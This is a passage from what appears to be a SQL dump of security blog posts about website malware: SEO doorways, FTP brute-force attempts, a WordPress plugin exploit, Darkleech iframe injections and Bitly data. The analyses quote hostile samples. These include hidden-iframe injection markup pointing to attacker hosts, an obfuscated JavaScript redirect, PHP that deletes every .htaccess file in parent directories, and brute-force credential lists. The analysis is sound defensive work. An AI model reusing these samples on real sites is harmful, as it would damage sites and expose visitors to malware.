traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (90, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (91, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (92, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (93, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (94, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (95, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
